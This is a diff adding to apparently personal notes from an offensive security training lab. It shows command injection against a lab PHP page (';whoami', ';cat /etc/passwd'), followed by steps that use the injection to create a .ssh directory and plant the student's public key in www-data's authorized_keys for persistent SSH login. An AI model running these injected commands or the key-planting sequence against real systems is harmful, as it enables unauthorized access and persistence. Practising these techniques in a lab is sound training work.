@@ -168,3 +168,32 @@ DAY2
     
         - Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
         - try entering commands (must have a semicolon before command, i.e. ; whoami)
+    
+    
+    SSH Keys 
+       ssh student@x.x.x.x password
+     on whichever host you plan on logging infrom, generate keys
+       - ssh-keygen -t rsa -b 4096
+        - public key is found in /home/student/.ssh/id_rsa.pub (cat)
+     Determine usr's home directory
+     ;cat /etc/passwd
+       - www-date:x:33:33:www-data:/var/www:/bin/bash
+       - user: www-data
+       - home dir: /var/www
+       - login shell: /bin/bash
+     Determine if .ssh/ directory exists in the users home directory; if not, create it
+       - ;mkdir /var/www/.ssh
+     Validate the .ssh/ directory has been created
+       - ;ls -la /var/www
+    Inject our key into the authorized_keys file (create directory if needed)
+       - echo  'ssh-rsa XcsEHSnd...== student@lin-ops' > /var/www/.ssh/authorized_keys
+    Validate the public is inside the authorized_keys file
+       - ;cat /var/www/.ssh/authorized_keys
+    Login from the workstation you generated the key from
+       - ssh www-data@x.x.x.x
+    
+    
+    
+    
+    
+    
